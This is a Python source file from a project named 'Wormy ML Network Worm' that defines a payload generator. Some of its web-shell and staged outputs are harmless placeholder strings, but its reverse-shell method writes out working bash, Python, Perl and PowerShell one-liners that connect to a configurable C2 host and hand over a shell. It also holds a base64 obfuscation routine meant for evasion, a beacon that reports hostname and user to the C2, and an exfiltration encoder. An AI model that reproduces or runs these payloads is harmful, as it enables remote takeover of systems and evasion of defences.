"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Payload Generator
Generates various payloads for different scenarios
"""


import base64
import os
import random
import sys
from typing import Dict, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class PayloadGenerator:
    """
    Generate various types of payloads for testing and simulation
    """

    def __init__(self, c2_server: str = "127.0.0.1", c2_port: int = 4444):
        self.c2_server = c2_server
        self.c2_port = c2_port

    def generate_web_shell(self, language: str = "php") -> str:
        """Generate a simulated web shell payload"""
        shells = {
            "php": f"<?php /* Simulated PHP web shell - C2: {self.c2_server}:{self.c2_port} */ ?>",
            "asp": f"<% " " Simulated ASP web shell - C2: {self.c2_server}:{self.c2_port} %>",
            "jsp": f"<%-- Simulated JSP web shell - C2: {self.c2_server}:{self.c2_port} --%>",
            "py": f"# Simulated Python web shell - C2: {self.c2_server}:{self.c2_port}",
        }
        return shells.get(language.lower(), shells["php"])

    def generate_reverse_shell(self, os_type: str = "linux", shell_type: str = "bash") -> str:
        """Generate a simulated reverse shell payload"""
        payloads = {
            "linux": {
                "bash": f"bash -i >& /dev/tcp/{self.c2_server}/{self.c2_port} 0>&1",
                "python": f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{self.c2_server}',{self.c2_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"",
                "perl": f'perl -e \'use Socket;$i="{self.c2_server}";$p={self.c2_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            },
            "windows": {
                "powershell": f'$client = New-Object System.Net.Sockets.TCPClient("{self.c2_server}",{self.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
                "cmd": f'cmd.exe /c "echo Simulated reverse shell to {self.c2_server}:{self.c2_port}"',
            },
        }
        os_payloads = payloads.get(os_type.lower(), payloads["linux"])
        return os_payloads.get(shell_type.lower(), list(os_payloads.values())[0])

    def generate_evasive_payload(self, payload: str, evasion_level: int = 2) -> str:
        """Apply obfuscation to a payload"""
        encoded = base64.b64encode(payload.encode()).decode()

        if evasion_level >= 2:
            padding = "".join([chr(random.randint(65, 90)) for _ in range(8)])
            encoded = f"{padding}{encoded}{padding}"

        if evasion_level >= 3:
            encoded = encoded[::-1]

        return encoded

    def generate_staged_payload(self, os_type: str = "linux") -> Dict[str, str]:
        """Generate a staged payload with multiple stages"""
        stages = {
            "stage1": f'echo "Stage 1: Initial connection to {self.c2_server}:{self.c2_port}"',
            "stage2": f'echo "Stage 2: Environment detection ({os_type})"',
            "stage3": f'echo "Stage 3: Payload deployment"',
            "stage4": f'echo "Stage 4: Persistence establishment"',
        }
        return stages

    def generate_beacon(self, host_info: Dict) -> str:
        """Generate a beacon payload"""
        import json

        beacon = {
            "type": "beacon",
            "host": host_info.get("hostname", "unknown"),
            "os": host_info.get("os", "unknown"),
            "user": host_info.get("user", "unknown"),
            "c2": f"{self.c2_server}:{self.c2_port}",
        }
        return json.dumps(beacon)

    def generate_exfil_payload(self, data: str) -> str:
        """Generate an exfiltration payload"""
        encoded = base64.b64encode(data.encode()).decode()
        return encoded
